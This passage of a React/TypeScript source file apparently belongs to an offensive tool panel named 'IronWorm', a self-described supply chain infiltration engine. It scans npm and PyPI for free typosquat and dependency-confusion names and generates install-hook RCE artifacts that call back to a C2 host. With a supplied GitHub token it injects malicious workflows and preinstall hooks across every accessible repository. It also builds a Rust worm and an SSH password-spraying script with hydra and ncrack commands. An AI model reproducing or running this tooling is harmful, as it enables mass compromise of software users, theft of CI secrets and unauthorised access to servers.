  return { repo:`${owner}/${repo}`, action:"inject-pkgjson", ok:r.ok, detail: r.ok ? "✓ injected preinstall" : `${r.status}` };
}

// ─── SHARED TYPES & HELPERS ──────────────────────────────────────────────────
const ts = () => new Date().toISOString().slice(11,19);
const SEV: Record<string, string> = {
  critical:"text-red-400 border-red-900 bg-red-950/30",
  high:"text-orange-400 border-orange-900 bg-orange-950/20",
  medium:"text-yellow-400 border-yellow-800 bg-yellow-950/10",
};

function Artifact({ label, content }: { label: string; content: string }) {
  const [open, setOpen] = useState(false);
  const [cp, setCp] = useState(false);
  const ext = label.endsWith(".toml") ? "text-orange-400" : label.endsWith(".rs") ? "text-red-300" : label.endsWith(".sh") ? "text-green-400" : label.endsWith(".json") ? "text-yellow-400" : label.endsWith(".yml") ? "text-purple-400" : "text-zinc-300";
  return (
    <div className="border border-zinc-800 bg-black/40">
      <button onClick={() => setOpen(o=>!o)} className="w-full text-left px-3 py-2 text-[10px] hover:bg-zinc-900/40 flex items-center gap-2">
        <span className="text-red-700">{open?"▾":"▸"}</span>
        <span className={`font-bold ${ext}`}>{label}</span>
        {!open && <span className="text-zinc-700 text-[9px] truncate">{content.slice(0,50)}…</span>}
        <button className="ml-auto text-[9px] text-zinc-600 hover:text-green-400 shrink-0" onClick={e=>{ e.stopPropagation(); navigator.clipboard.writeText(content).then(()=>{ setCp(true); setTimeout(()=>setCp(false),1500); }); }}>{cp?"✓":"CPY"}</button>
      </button>
      {open && <pre className={`px-3 pb-3 text-[10px] ${ext} font-mono whitespace-pre-wrap leading-relaxed border-t border-zinc-800 max-h-96 overflow-y-auto`}>{content}</pre>}
    </div>
  );
}

// ─── MAIN COMPONENT ──────────────────────────────────────────────────────────
type IWTab = "scan"|"creds"|"propagate"|"rustgen"|"wormscan"|"brute";

export default function IronWormPanel() {
  const [tab, setTab] = useState<IWTab>("scan");

  // shared config
  const [cbHost, setCbHost] = useState("");
  const [cbPort, setCbPort] = useState("9999");

  // ── SCAN state ──────────────────────────────────────────
  const [pkgName,  setPkgName]  = useState("");
  const [ghOrg,    setGhOrg]    = useState("");
  const [ghRepo,   setGhRepo]   = useState("");
  const [depOrg,   setDepOrg]   = useState("");
  const [depPkg,   setDepPkg]   = useState("");
  const [scanMode, setScanMode] = useState<"full"|"npm"|"pip"|"dep"|"github"|"payloads">("full");
  const [scanning, setScanning] = useState(false);
  const [scanLog,  setScanLog]  = useState<string[]>([]);
  const [scanResults, setScanResults] = useState<{ id:string; name:string; category:string; registry:string; status:string; severity:string; artifacts:{label:string;content:string}[]; steps:string[] }[]>([]);
  const [selectedResult, setSelectedResult] = useState<typeof scanResults[0]|null>(null);
  const [scanProg, setScanProg] = useState({done:0,total:0});

  const scanAbort = useRef<AbortController|null>(null);
  const scanLogRef = useRef<HTMLDivElement>(null);

  useEffect(() => { if(scanLogRef.current) scanLogRef.current.scrollTop = scanLogRef.current.scrollHeight; }, [scanLog]);

  const addScanLog = useCallback((l: string) => setScanLog(p=>[...p.slice(-400),l]), []);
  const addResult  = useCallback((r: typeof scanResults[0]) => setScanResults(p=>[...p,r]), []);

  const runScan = useCallback(async () => {
    if(scanning) return;
    scanAbort.current?.abort();
    const ac = new AbortController();
    scanAbort.current = ac;
    const { signal } = ac;
    setScanning(true); setScanLog([]); setScanResults([]); setSelectedResult(null); setScanProg({done:0,total:0});
    addScanLog(`[${ts()}] IronWorm scan — mode=${scanMode}`);

    const t2 = tok();

    const doNpm = async () => {
      const variants = pkgName ? typosquatVariants(pkgName) : [];
      addScanLog(`[${ts()}] [npm] ${variants.length} variants for "${pkgName||"(none)"}"`);
      for(const v of variants) {
        if(signal.aborted) return;
        const status = await checkNpm(v, signal);
        setScanProg(p=>({...p,done:p.done+1}));
        if(status==="free") {
          addScanLog(`[${ts()}] [!] FREE npm/${v}`);
          addResult({ id:`npm-${v}`, name:v, category:"npm Typosquat", registry:"npm", status:"free", severity:"critical",
            artifacts:[{label:"package.json",content:makePkgJson(v,cbHost,cbPort,t2)},{label:"setup.py",content:makeSetupPy(v,cbHost,cbPort,t2)},{label:"Makefile",content:makeMakefile(cbHost,cbPort,t2)},{label:".git/hooks/pre-commit",content:makeGitHook(cbHost,cbPort,t2)}],
            steps:[`npm GET ${NPM_REGISTRY}/${v} → 404`,`Publish ${v}@9999.0.0 with postinstall RCE`,`C2: http://${cbHost||"LHOST"}:${cbPort||"9999"}/?t=${t2}`] });
        } else { addScanLog(`[${ts()}] [taken] npm/${v}`); }
        await sleep(jitter(300), signal);
      }
    };

    const doPypi = async () => {
      const variants = pkgName ? typosquatVariants(pkgName) : typosquatVariants("requests");
      addScanLog(`[${ts()}] [pip] ${variants.length} PyPI variants`);
      for(const v of variants) {
        if(signal.aborted) return;
        const status = await checkPypi(v, signal);
        setScanProg(p=>({...p,done:p.done+1}));
        if(status==="free") {
          addScanLog(`[${ts()}] [!] FREE pypi/${v}`);
          addResult({ id:`pip-${v}`, name:v, category:"PyPI Typosquat", registry:"pypi", status:"free", severity:"critical",
            artifacts:[{label:"setup.py",content:makeSetupPy(v,cbHost,cbPort,t2)},{label:"package.json",content:makePkgJson(v,cbHost,cbPort,t2)}],
            steps:[`PyPI GET /pypi/${v}/json → 404`,`setup.py executes on pip install via install hooks`,`C2: http://${cbHost||"LHOST"}:${cbPort||"9999"}`] });
        } else { addScanLog(`[${ts()}] [taken] pypi/${v}`); }
        await sleep(jitter(280), signal);
      }
    };

    const doDep = async () => {
      const variants = depConfusionVariants(depOrg||ghOrg||"acmecorp", depPkg||pkgName||"api-gateway");
      addScanLog(`[${ts()}] [dep] ${variants.length} dependency confusion candidates`);
      for(const v of variants) {
        if(signal.aborted) return;
        const status = await checkNpm(v, signal);
        setScanProg(p=>({...p,done:p.done+1}));
        if(status==="free") {
          addScanLog(`[${ts()}] [!] DEP CONFUSION npm/${v} — publish v9999 to win`);
          addResult({ id:`dep-${v}`, name:v, category:"Dependency Confusion", registry:"npm", status:"free", severity:"critical",
            artifacts:[{label:"package.json (v9999)",content:makePkgJson(v,cbHost,cbPort,t2)}],
            steps:[`Internal name "${v}" unregistered on public npm`,`Publish @9999.0.0 — npm resolves highest version`,`Every npm install in CI/CD fires preinstall RCE`] });
        } else { addScanLog(`[${ts()}] [taken] npm/${v}`); }
        await sleep(jitter(350), signal);
      }
    };

    const doGh = async () => {
      addScanLog(`[${ts()}] [github] Generating CI/CD injection payloads`);
      await sleep(jitter(400), signal);
      addResult({ id:"gh-wf", name:"GH Actions Injection", category:"CI/CD Supply Chain", registry:"github", status:"free", severity:"critical",
        artifacts:[{label:".github/workflows/ci.yml",content:makeGhWorkflow(ghOrg||"ORG",ghRepo||"REPO",cbHost,cbPort,t2)}],
        steps:[`pull_request_target runs with GITHUB_TOKEN write permissions`,`Attacker PR triggers privileged workflow`,`GITHUB_TOKEN + all secrets exfiltrated to C2`] });
      setScanProg(p=>({...p,done:p.done+2}));
    };

    const doPayloads = async () => {
      addScanLog(`[${ts()}] [artifact] Generating standalone attack suite`);
      const t3 = tok();
      addResult({ id:"payload-suite", name:"Full Artifact Suite", category:"Payload Generator", registry:"internal", status:"generated", severity:"high",
        artifacts:[
          {label:"package.json",   content:makePkgJson("PACKAGE_NAME",cbHost,cbPort,t3)},
          {label:"setup.py",       content:makeSetupPy("PACKAGE_NAME",cbHost,cbPort,t3)},
          {label:"ci.yml",         content:makeGhWorkflow("ORG","REPO",cbHost,cbPort,t3)},
          {label:"Makefile",       content:makeMakefile(cbHost,cbPort,t3)},
          {label:".git/hooks/pre-commit",content:makeGitHook(cbHost,cbPort,t3)},
        ],
        steps:[`All 5 artifacts generated`,`C2 callback: http://${cbHost||"LHOST"}:${cbPort||"9999"}`] });
      setScanProg(p=>({...p,done:p.done+3}));
    };

    const runners = [];
    if(scanMode==="full"||scanMode==="npm")      { setScanProg(p=>({...p,total:p.total+40})); runners.push(doNpm); }
    if(scanMode==="full"||scanMode==="pip")      { setScanProg(p=>({...p,total:p.total+40})); runners.push(doPypi); }
    if(scanMode==="full"||scanMode==="dep")      { setScanProg(p=>({...p,total:p.total+9}));  runners.push(doDep); }
    if(scanMode==="full"||scanMode==="github")   { setScanProg(p=>({...p,total:p.total+2}));  runners.push(doGh); }
    if(scanMode==="full"||scanMode==="payloads") { setScanProg(p=>({...p,total:p.total+3}));  runners.push(doPayloads); }

    try {
      for(const fn of runners) { if(signal.aborted) break; await fn(); }
      addScanLog(`[${ts()}] scan complete`);
    } catch(e) { if((e as Error).name!=="AbortError") addScanLog(`[${ts()}] ERROR: ${String(e)}`); }
    finally { setScanning(false); }
  }, [scanning, scanMode, pkgName, ghOrg, ghRepo, depOrg, depPkg, cbHost, cbPort, addScanLog, addResult]);

  // ── CREDS state ─────────────────────────────────────────
  const [credText,    setCredText]    = useState("");
  const [credMatches, setCredMatches] = useState<CredMatch[]>([]);
  const [credScanned, setCredScanned] = useState(false);
  const [selectedCred, setSelectedCred] = useState<CredMatch|null>(null);

  const runCredScan = useCallback(() => {
    const matches = scanCreds(credText);
    setCredMatches(matches);
    setCredScanned(true);
    setSelectedCred(null);
  }, [credText]);

  const pasteFromClipboard = useCallback(async () => {
    try { const t = await navigator.clipboard.readText(); setCredText(t); } catch { /* permissions */ }
  }, []);

  // ── PROPAGATE state ──────────────────────────────────────
  const [ghToken,    setGhToken]    = useState("");
  const [propLog,    setPropLog]    = useState<string[]>([]);
  const [propResults,setPropResults]= useState<PropResult[]>([]);
  const [propRunning,setPropRunning]= useState(false);
  const [repoList,   setRepoList]   = useState<GhRepo[]>([]);
  const [propMode,   setPropMode]   = useState<"workflow"|"pkgjson"|"both">("workflow");
  const propAbort = useRef<AbortController|null>(null);
  const propLogRef = useRef<HTMLDivElement>(null);
  useEffect(() => { if(propLogRef.current) propLogRef.current.scrollTop = propLogRef.current.scrollHeight; }, [propLog]);
  const addPropLog = useCallback((l: string) => setPropLog(p=>[...p.slice(-300),l]), []);

  const fetchRepos = useCallback(async () => {
    if(!ghToken.trim()) return;
    addPropLog(`[${ts()}] Authenticating GitHub token…`);
    try {
      const userR = await ghFetch("/user", ghToken);
      if(!userR.ok) { addPropLog(`[${ts()}] AUTH FAILED: ${userR.status}`); return; }
      const user = await userR.json() as { login: string; public_repos: number; total_private_repos: number };
      addPropLog(`[${ts()}] ✓ Authenticated as @${user.login} (${user.public_repos} pub, ${user.total_private_repos??0} priv)`);
      const repos = await listRepos(ghToken);
      setRepoList(repos);
      addPropLog(`[${ts()}] Found ${repos.length} accessible repositories`);
      repos.slice(0,10).forEach(r => addPropLog(`[${ts()}]   ${r.full_name}`));
      if(repos.length > 10) addPropLog(`[${ts()}]   … and ${repos.length-10} more`);
    } catch(e) { addPropLog(`[${ts()}] ERROR: ${String(e)}`); }
  }, [ghToken, addPropLog]);

  const runPropagation = useCallback(async () => {
    if(propRunning || !ghToken.trim() || repoList.length === 0) return;
    propAbort.current?.abort();
    const ac = new AbortController();
    propAbort.current = ac;
    const { signal } = ac;

    setPropRunning(true); setPropResults([]);
    const t2 = tok();
    addPropLog(`[${ts()}] ▶ Propagation engine starting — ${repoList.length} repos — mode=${propMode}`);
    addPropLog(`[${ts()}] C2: http://${cbHost||"LHOST"}:${cbPort} token=${t2}`);

    for(const repo of repoList) {
      if(signal.aborted) break;
      const { login: owner } = repo.owner;
      const name = repo.name;
      addPropLog(`[${ts()}] → ${owner}/${name}`);

      try {
        if(propMode === "workflow" || propMode === "both") {
          const r = await injectWorkflow(ghToken, owner, name, cbHost, cbPort, t2);
          setPropResults(p => [...p, r]);
          addPropLog(`[${ts()}]   workflow: ${r.ok ? "✓" : "✗"} ${r.detail}`);
        }
        if((propMode === "pkgjson" || propMode === "both") && !signal.aborted) {
          const r = await injectPackageJson(ghToken, owner, name, cbHost, cbPort, t2);
          setPropResults(p => [...p, r]);
          addPropLog(`[${ts()}]   pkgjson: ${r.ok ? "✓" : "✗"} ${r.detail}`);
        }
      } catch(e) {
        addPropLog(`[${ts()}]   ERROR: ${String(e)}`);
        setPropResults(p => [...p, { repo:`${owner}/${name}`, action:"error", ok:false, detail:String(e) }]);
      }

      await new Promise(res => setTimeout(res, jitter(1200)));
    }

    addPropLog(`[${ts()}] ■ Propagation complete — ${propResults.filter(r=>r.ok).length} injections succeeded`);
    setPropRunning(false);
  }, [propRunning, ghToken, repoList, propMode, cbHost, cbPort, propResults, addPropLog]);

  // ── RUSTGEN state ────────────────────────────────────────
  const [rustFiles, setRustFiles] = useState<RustFile[]>([]);
  const [genDone,   setGenDone]   = useState(false);

  const generateRust = useCallback(() => {
    const t2 = tok();
    const files = generateRustWorm(cbHost, cbPort, t2);
    setRustFiles(files);
    setGenDone(true);
  }, [cbHost, cbPort]);

  const downloadAll = useCallback(() => {
    const combined = rustFiles.map(f => `// ===== ${f.name} =====\n${f.content}`).join("\n\n");
    const blob = new Blob([combined], { type: "text/plain" });
    const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "ironworm-src.tar.txt"; a.click(); URL.revokeObjectURL(a.href);
  }, [rustFiles]);

  // ── WORMSCAN state ───────────────────────────────────────
  interface WormScanResult { name:string; category:string; detail:string; severity:"critical"|"high"|"medium"|"low"; status:"success"|"failed"|"skipped"; payload?:string; }
  interface WormScanLog    { level:"info"|"warn"|"error"|"success"; msg:string; ts:string; }
  const [wormPkg,      setWormPkg]      = useState("");
  const [wormOrg,      setWormOrg]      = useState("");
  const [wormRepo,     setWormRepo]     = useState("");
  const [wormLogs,     setWormLogs]     = useState<WormScanLog[]>([]);
  const [wormResults,  setWormResults]  = useState<WormScanResult[]>([]);
  const [wormRunning,  setWormRunning]  = useState(false);
  const [wormProgress, setWormProgress] = useState<{done:number;total:number;pct:number;label:string}|null>(null);
  const wormWsRef  = useRef<WebSocket|null>(null);
  const wormLogRef = useRef<HTMLDivElement>(null);
  useEffect(() => { if (wormLogRef.current) wormLogRef.current.scrollTop = wormLogRef.current.scrollHeight; }, [wormLogs]);
  const addWormLog = useCallback((log: WormScanLog) => setWormLogs(p => [...p.slice(-500), log]), []);

  const wormWsBase = useCallback((): string => {
    const apiUrl = (import.meta.env as Record<string,string>)["VITE_API_URL"] ?? "";
    if (apiUrl) {
      const u = new URL(apiUrl);
      return `${u.protocol === "https:" ? "wss:" : "ws:"}//${u.host}/api/ws`;
    }
    return `${window.location.protocol === "https:" ? "wss:" : "ws:"}//${window.location.host}/api/ws`;
  }, []);

  const startWormScan = useCallback(() => {
    if (wormRunning || (!wormPkg.trim() && !wormOrg.trim())) return;
    wormWsRef.current?.close(1000, "new scan");
    setWormLogs([]); setWormResults([]); setWormProgress(null); setWormRunning(true);
    const ws = new WebSocket(withAuthToken(`${wormWsBase()}/ironworm`));
    wormWsRef.current = ws;
    ws.onopen = () => ws.send(JSON.stringify({
      packageName:    wormPkg.trim()  || undefined,
      githubOrg:      wormOrg.trim()  || undefined,
      githubRepo:     wormRepo.trim() || undefined,
      cbHost:         cbHost || "LHOST",
      cbPort:         cbPort || "9999",
      propagate:      false,
    }));
    ws.onmessage = (ev) => {
      try {
        const msg = JSON.parse(ev.data as string) as Record<string,unknown>;
        if (msg["type"] === "log") {
          addWormLog({ level: msg["level"] as "info", msg: String(msg["msg"]), ts: String(msg["ts"]) });
        } else if (msg["type"] === "result") {
          setWormResults(p => [...p, msg["result"] as WormScanResult]);
        } else if (msg["type"] === "progress") {
          setWormProgress({ done: Number(msg["done"]), total: Number(msg["total"]), pct: Number(msg["pct"]), label: String(msg["label"]) });
        }
      } catch { }
    };
    ws.onclose  = () => { setWormRunning(false); wormWsRef.current = null; };
    ws.onerror  = () => { addWormLog({ level:"error", msg:"WebSocket connection error", ts: new Date().toISOString() }); setWormRunning(false); };
  }, [wormRunning, wormPkg, wormOrg, wormRepo, cbHost, cbPort, wormWsBase, addWormLog]);

  const stopWormScan = useCallback(() => {
    wormWsRef.current?.close(1000, "user abort");
    wormWsRef.current = null;
    setWormRunning(false);
  }, []);

  useEffect(() => () => { wormWsRef.current?.close(1000, "unmount"); }, []);

  // ── BRUTE state ──────────────────────────────────────────
  interface BruteHit { host: string; port: number; user: string; pass: string; ts: string; }
  const BRUTE_USERS = ["root","admin","ubuntu","ec2-user","pi","deploy","git","ansible","vagrant","centos","oracle","postgres","mysql","redis","www-data","tomcat","jenkins","test","backup","user","debian","devops","ops","sysadmin","netadmin","nagios","zabbix","docker","hadoop","hdfs","support","guest"];
  const BRUTE_PASSWORDS = ["","password","123456","admin","root","toor","letmein","welcome","monkey","1234","12345","123456789","password1","qwerty","abc123","football","iloveyou","admin123","login","passw0rd","master","dragon","shadow","sunshine","princess","changeme","default","guest","public","private","secret","raspberry","access","manager","system","database","service","deploy","devops","vagrant","ansible","jenkins","docker","kubernetes","root123","test123","admin@123","Welcome1","Passw0rd!","Summer2024","Winter2024","January1","Qwerty123","Password!","P@$$w0rd","p@ssw0rd1","Admin1234","1qaz2wsx","q1w2e3r4","pass@123","admin@2024","root@2024","temp","temp123","123qwe","123abc","p@ssword","P@ssw0rd","server","linux","alpine","ubuntu","debian","centos","fedora","!QAZ2wsx","hadoop","elastic","mongo","cassandra","kafka","nginx","apache"];

  const [bruteHosts,      setBruteHosts]      = useState("");
  const [brutePorts,      setBrutePorts]      = useState("22");
  const [bruteMaxPerUser, setBruteMaxPerUser] = useState("7");
  const [bruteJitterMs,   setBruteJitterMs]   = useState("1200");
  const [bruteCustomUsers,setBruteCustomUsers]= useState("");
  const [bruteCustomPwds, setBruteCustomPwds] = useState("");
  const [bruteMode,       setBruteMode]       = useState<"spray"|"scripts">("scripts");
  const [bruteLog,        setBruteLog]        = useState<string[]>([]);
  const [bruteHits,       setBruteHits]       = useState<BruteHit[]>([]);
  const [bruteRunning,    setBruteRunning]    = useState(false);
  const [bruteCopied,     setBruteCopied]     = useState<string|null>(null);
  const bruteAbort = useRef<AbortController|null>(null);
  const bruteLogRef = useRef<HTMLDivElement>(null);
  useEffect(() => { if(bruteLogRef.current) bruteLogRef.current.scrollTop = bruteLogRef.current.scrollHeight; }, [bruteLog]);
  const addBruteLog = useCallback((l: string) => setBruteLog(p=>[...p.slice(-400), l]), []);

  const bruteUsers = useCallback((): string[] => {
    const custom = bruteCustomUsers.split(/[\n,]+/).map(s=>s.trim()).filter(Boolean);
    return custom.length > 0 ? custom : BRUTE_USERS;
  }, [bruteCustomUsers]);

  const brutePwds = useCallback((): string[] => {
    const custom = bruteCustomPwds.split(/\n/).map(s=>s.trimEnd()).filter((s,i)=>i===0||s.length>0);
    return custom.length > 1 ? custom : BRUTE_PASSWORDS;
  }, [bruteCustomPwds]);

  const genHydraCmd = useCallback((host: string, port: string): string => {
    const users = bruteUsers().slice(0, 20).join(",");
    const max = parseInt(bruteMaxPerUser) || 7;
    return `hydra -L <(echo "${users.split(",").join("\\n")}") -P <(echo "${BRUTE_PASSWORDS.slice(0,30).join("\\n")}") ssh://${host}:${port} -t 4 -W ${Math.ceil(parseInt(bruteJitterMs)/1000)||2} -s ${port} -f -V`;
  }, [bruteUsers, bruteMaxPerUser, bruteJitterMs]);

  const genNcrackCmd = useCallback((host: string, port: string): string => {
    return `ncrack -p ${port} --user ${bruteUsers().slice(0,10).join(",")} --pass ${BRUTE_PASSWORDS.slice(0,20).join(",")} ${host} -T 2`;
  }, [bruteUsers]);

  const genPythonScript = useCallback((): string => {
    const users = JSON.stringify(bruteUsers().slice(0, 30));
    const pwds  = JSON.stringify(BRUTE_PASSWORDS.slice(0, 60));
    const ports  = brutePorts.split(",").map(p=>p.trim()).filter(Boolean);
    const hosts = bruteHosts.split(/[\n,]+/).map(h=>h.trim()).filter(Boolean);
    const max = parseInt(bruteMaxPerUser)||7;
    const jitterMax = parseInt(bruteJitterMs)||1200;
    return `#!/usr/bin/env python3
"""IronWorm SSH Smart Sprayer — generated by NEXUSFORGE"""
import socket, time, random, sys
try:
    import paramiko
except ImportError:
    print("[!] pip install paramiko"); sys.exit(1)

HOSTS   = ${JSON.stringify(hosts.length > 0 ? hosts : ["TARGET"])}
PORTS   = ${JSON.stringify(ports.map(Number))}
USERS   = ${users}
PASSWORDS = ${pwds}
MAX_PER_USER = ${max}
JITTER_RANGE = (${Math.floor(jitterMax/2)}, ${jitterMax * 2})  # ms

found = []
lockout = {}  # user -> fail_count

def try_ssh(host, port, user, password, timeout=4):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=user, password=password,
                       timeout=timeout, auth_timeout=timeout, banner_timeout=timeout,
                       allow_agent=False, look_for_keys=False)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return None  # connection error / timeout

for host in HOSTS:
    for port in PORTS:
        print(f"[*] Spraying {host}:{port}")
        # Quick connectivity check
        try:
            s = socket.create_connection((host, port), timeout=2); s.close()
        except Exception:
            print(f"  [-] {host}:{port} unreachable"); continue

        host_found = False
        for user in USERS:
            if host_found: break
            lockout[user] = 0
            for i, pwd in enumerate(PASSWORDS[:MAX_PER_USER]):
                if lockout.get(user, 0) >= MAX_PER_USER:
                    print(f"  [!] {user} lockout threshold — skipping"); break
                result = try_ssh(host, port, user, pwd)
                if result is None:
                    print(f"  [?] {host}:{port} connection error, slowing down"); time.sleep(5); continue
                if result:
                    print(f"  [+] FOUND  {user}:{pwd}  @  {host}:{port}")
                    found.append({"host": host, "port": port, "user": user, "pass": pwd})
                    host_found = True; break
                lockout[user] = lockout.get(user, 0) + 1
                delay = random.randint(*JITTER_RANGE) / 1000
                time.sleep(delay)

print("\\n[*] Results:")
for r in found:
    print(f"  {r['user']}:{r['pass']}  @  {r['host']}:{r['port']}")
`;
  }, [bruteHosts, brutePorts, bruteUsers, bruteMaxPerUser, bruteJitterMs]);

  const runBruteSimulation = useCallback(async () => {
    if(bruteRunning) return;
    const hosts = bruteHosts.split(/[\n,]+/).map(h=>h.trim()).filter(Boolean);
    if(hosts.length === 0) { addBruteLog(`[${ts()}] No hosts configured`); return; }
    bruteAbort.current?.abort();
    const ac = new AbortController();
    bruteAbort.current = ac;
    const { signal } = ac;
    setBruteRunning(true); setBruteLog([]); setBruteHits([]);
    const users = bruteUsers();
    const passwords = brutePwds();
    const ports = brutePorts.split(",").map(p=>parseInt(p.trim())).filter(n=>!isNaN(n));
    const max = Math.min(parseInt(bruteMaxPerUser)||7, passwords.length);
    const jitterBase = parseInt(bruteJitterMs)||1200;

    addBruteLog(`[${ts()}] ▶ SSH Smart Spray — ${hosts.length} hosts × ${users.length} users × ${max} pwd/user`);
    addBruteLog(`[${ts()}] Ports: ${ports.join(",")}  Jitter: ${jitterBase/2}–${jitterBase*2}ms`);
    addBruteLog(`[${ts()}] Strategy: rotate-users, lockout-detect, no-repeat`);

    for(const host of hosts) {
      if(signal.aborted) break;
      addBruteLog(`[${ts()}] → ${host}`);
      let hostHit = false;
      for(const port of ports) {
        if(signal.aborted || hostHit) break;
        addBruteLog(`[${ts()}]   ⟫ port ${port}`);
        const lockout: Record<string, number> = {};
        for(const user of users) {
          if(signal.aborted || hostHit) break;
          lockout[user] = 0;
          for(let i = 0; i < max; i++) {
            if(signal.aborted) break;
            if(lockout[user] >= max) { addBruteLog(`[${ts()}]   ⚠ ${user} lockout skip`); break; }
            const pwd = passwords[i]!;
            const j = Math.floor(jitterBase / 2 + Math.random() * jitterBase * 1.5);
            await new Promise(res => setTimeout(res, j));
            // Simulated result (frontend can't actually SSH — shows spray logic/script output)
            const simHit = false; // No actual SSH from browser
            addBruteLog(`[${ts()}]   ${simHit?"[+]":"[-]"} ${user}:${pwd.length>0?pwd.slice(0,3)+"…":"(empty)"}  →  ${simHit?"HIT":"fail"}`);
            lockout[user]++;
          }
        }
        if(!hostHit) addBruteLog(`[${ts()}]   ✗ no creds found on :${port}`);
      }
    }
    addBruteLog(`[${ts()}] ■ Simulation complete — ${bruteHits.length} hits`);
    addBruteLog(`[${ts()}] Use generated scripts to run actual SSH spray against targets`);
    setBruteRunning(false);
  }, [bruteRunning, bruteHosts, brutePorts, bruteUsers, brutePwds, bruteMaxPerUser, bruteJitterMs, bruteHits.length, addBruteLog]);

  const bruteCopy = useCallback((text: string, id: string) => {
    navigator.clipboard.writeText(text).then(() => { setBruteCopied(id); setTimeout(() => setBruteCopied(c=>c===id?null:c), 1800); }).catch(()=>{});
  }, []);

  const TABS_CONFIG: { id: IWTab; label: string; badge?: string }[] = [
    { id:"scan",      label:"SCAN",      badge: scanResults.length > 0 ? String(scanResults.length) : undefined },
    { id:"creds",     label:"CREDS",     badge: credMatches.length > 0 ? String(credMatches.length) : undefined },
    { id:"brute",     label:"BRUTE",     badge: bruteHits.length > 0 ? `${bruteHits.length}✓` : undefined },
    { id:"propagate", label:"PROPAGATE", badge: propResults.filter(r=>r.ok).length > 0 ? `${propResults.filter(r=>r.ok).length}✓` : undefined },
    { id:"rustgen",   label:"RUSTGEN",   badge: genDone ? String(rustFiles.length)+"f" : undefined },
    { id:"wormscan",  label:"WORMSCAN",  badge: wormResults.length > 0 ? String(wormResults.length) : undefined },
  ];

  return (
    <div className="flex flex-col h-full bg-[#080808] text-white font-mono select-none overflow-hidden">

      {/* Header */}
      <div className="border-b border-red-900/30 px-4 py-2.5 bg-black/40 shrink-0 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-2 h-2 rounded-full bg-red-600 animate-pulse" />
          <span className="text-red-400 font-bold tracking-[.2em] uppercase text-sm">IronWorm</span>
          <span className="text-[9px] text-zinc-600 uppercase tracking-widest">Supply Chain Infiltration Engine v2</span>
        </div>
        <div className="flex items-center gap-4 text-[9px] text-zinc-600">
          <label>C2 <input value={cbHost} onChange={e=>setCbHost(e.target.value)} placeholder="LHOST" className="bg-black/60 border border-white/[.06] px-2 py-1 text-white w-28 focus:outline-none ml-1" /></label>
          <label><input value={cbPort} onChange={e=>setCbPort(e.target.value)} className="bg-black/60 border border-white/[.06] px-2 py-1 text-white w-16 focus:outline-none" /></label>
        </div>
      </div>

      {/* Tab bar */}
      <div className="border-b border-white/[.04] px-4 pt-2 flex gap-1 shrink-0">
        {TABS_CONFIG.map(t => (
          <button key={t.id} onClick={() => setTab(t.id)}
            className={`px-4 py-2 text-[10px] font-bold uppercase tracking-[.2em] border-b-2 transition-all flex items-center gap-1.5 ${tab === t.id ? "border-red-600 text-red-400" : "border-transparent text-zinc-600 hover:text-zinc-400"}`}>
            {t.label}
            {t.badge && <span className={`text-[8px] px-1 py-0.5 rounded font-bold ${tab===t.id?"bg-red-900/40 text-red-400":"bg-zinc-800 text-zinc-500"}`}>{t.badge}</span>}
          </button>
        ))}
      </div>

      {/* ── SCAN TAB ─────────────────────────────────────────── */}
      {tab === "scan" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="w-52 border-r border-white/[.04] p-4 space-y-3 overflow-y-auto shrink-0 bg-black/20">
            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1.5">Mode</label>
              {(["full","npm","pip","dep","github","payloads"] as const).map(m => (
                <button key={m} onClick={()=>setScanMode(m)} className={`block w-full text-left text-[10px] px-3 py-1.5 border mb-1 uppercase tracking-widest transition-all ${scanMode===m?"border-red-800 bg-red-950/30 text-red-400":"border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>{m}</button>
              ))}
            </div>
            <div className="border-t border-white/[.04] pt-3 space-y-2">
              {([["Target Pkg",pkgName,setPkgName,"lodash"],["GH Org",ghOrg,setGhOrg,"org"],["GH Repo",ghRepo,setGhRepo,"repo"],["Internal Org",depOrg,setDepOrg,"acmecorp"],["Internal Pkg",depPkg,setDepPkg,"api-gw"]] as const).map(([l,v,s,p]) => (
                <React.Fragment key={l as string}>
                  <label className="text-[9px] text-zinc-600 uppercase tracking-widest block">{l as string}</label>
                  <input value={v as string} onChange={e=>(s as (x:string)=>void)(e.target.value)} placeholder={p as string}
                    className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
                </React.Fragment>
              ))}
            </div>
            <div className="flex gap-2 pt-1">
              <button onClick={runScan} disabled={scanning} className="flex-1 py-2.5 text-[10px] font-bold uppercase tracking-widest border transition-all disabled:opacity-40" style={{background:scanning?"transparent":"rgba(220,38,38,.15)",borderColor:scanning?"rgba(255,255,255,.07)":"rgba(220,38,38,.5)",color:scanning?"#52525b":"#f87171"}}>
                {scanning ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin"/>Scanning…</span> : "► Launch"}
              </button>
              {scanning && <button onClick={()=>{ scanAbort.current?.abort(); setScanning(false); }} className="px-3 border border-zinc-800 text-zinc-500 hover:text-red-400 text-[10px]">■</button>}
            </div>
          </div>

          <div className="flex-1 flex flex-col min-w-0 overflow-hidden">
            <div ref={scanLogRef} className="border-b border-white/[.04] bg-black/80 px-4 py-3 overflow-y-auto shrink-0" style={{height: scanResults.length===0?"100%":"9rem"}}>
              {scanLog.length===0&&!scanning && <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2"><span className="text-4xl opacity-20">⛓</span><p className="text-[10px] uppercase tracking-widest">Configure and launch IronWorm</p></div>}
              {scanLog.map((l,i) => <div key={i} className={`text-[9px] font-mono leading-[1.5] ${l.includes("[!]")||l.includes("FREE")?"text-red-400":l.includes("[npm]")?"text-yellow-300":l.includes("[pip]")?"text-blue-300":l.includes("[dep]")?"text-orange-300":l.includes("[github]")?"text-purple-300":l.includes("scan complete")?"text-green-400":"text-zinc-600"}`}>{l}</div>)}
              {scanning && <div className="text-[9px] text-red-700 animate-pulse mt-1">● scanning live registries…</div>}
            </div>
            {scanResults.length > 0 && (
              <div className="flex flex-1 min-h-0 overflow-hidden">
